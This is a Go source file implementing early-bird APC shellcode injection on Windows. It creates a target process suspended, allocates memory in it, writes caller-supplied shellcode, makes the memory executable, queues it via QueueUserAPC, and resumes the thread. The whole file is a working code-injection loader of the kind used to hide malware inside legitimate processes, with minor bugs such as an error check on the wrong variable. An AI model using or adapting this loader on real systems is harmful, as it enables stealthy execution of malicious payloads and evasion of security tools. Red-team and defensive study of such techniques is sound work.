package injection

import (
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"syscall"
	"unsafe"
)

func Inject(verbose bool, debug bool, program string, args string, shellcode []byte) (bool, error) {
	// Load DLLs and Procedures
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	if debug {
		fmt.Println("[DEBUG]Loading supporting procedures...")
	}
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")

	// Create child proccess in suspended state
	/*
		BOOL CreateProcessW(
		LPCWSTR               lpApplicationName,
		LPWSTR                lpCommandLine,
		LPSECURITY_ATTRIBUTES lpProcessAttributes,
		LPSECURITY_ATTRIBUTES lpThreadAttributes,
		BOOL                  bInheritHandles,
		DWORD                 dwCreationFlags,
		LPVOID                lpEnvironment,
		LPCWSTR               lpCurrentDirectory,
		LPSTARTUPINFOW        lpStartupInfo,
		LPPROCESS_INFORMATION lpProcessInformation
		);
	*/

	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}

	errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr(program), syscall.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	if verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created the %s process in PID %d", program, procInfo.ProcessId))
	}

	// Allocate memory in child process
	if debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", procInfo.ProcessId))
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", procInfo.ProcessId))
	}
	if debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Shellcode address: 0x%x", addr))
	}

	// Write shellcode into child process memory
	if debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", procInfo.ProcessId))
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote %d shellcode bytes to PID %d", len(shellcode), procInfo.ProcessId))
	}

	// Change memory permissions to RX in child process where shellcode was written
	if debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", procInfo.ProcessId))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	if verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully changed memory permissions to PAGE_EXECUTE_READ in PID %d", procInfo.ProcessId))
	}

	// QueueUserAPC
	if debug {
		fmt.Println("[DEBUG]Calling QueueUserAPC")
	}

	ret, _, err := QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
	if err != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling QueueUserAPC:\n%s", err.Error()))
	}
	if debug {
		fmt.Printf("[DEBUG]The QueueUserAPC call returned %v\n", ret)
	}
	if verbose {
		fmt.Printf("[-]Successfully queued a UserAPC on process ID %d\n", procInfo.ProcessId)
	}

	// Resume the child process
	if debug {
		fmt.Println("[DEBUG]Calling ResumeThread...")
	}
	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
	if errResumeThread != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
	}
	if verbose {
		fmt.Println("[+]Process resumed and shellcode executed")
	}

	// Close the handle to the child process
	if debug {
		fmt.Println("[DEBUG]Calling CloseHandle on child process...")
	}
	errCloseProcHandle := windows.CloseHandle(procInfo.Process)
	if errCloseProcHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error closing the child process handle:\r\n\t%s", errCloseProcHandle.Error()))
	}

	// Close the hand to the child process thread
	if debug {
		fmt.Println("[DEBUG]Calling CloseHandle on child process thread...")
	}
	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
	}
	return false, nil
}

func MessageBox(hWnd uintptr, lpText string, lpCaption string, uType uint) int {
	user32 := windows.NewLazySystemDLL("user32.dll")
	MessageBoxW := user32.NewProc("MessageBoxW")
	ret, _, _ := MessageBoxW.Call(
		uintptr(hWnd),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpText))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCaption))),
		uintptr(uType))
	return int(ret)
}
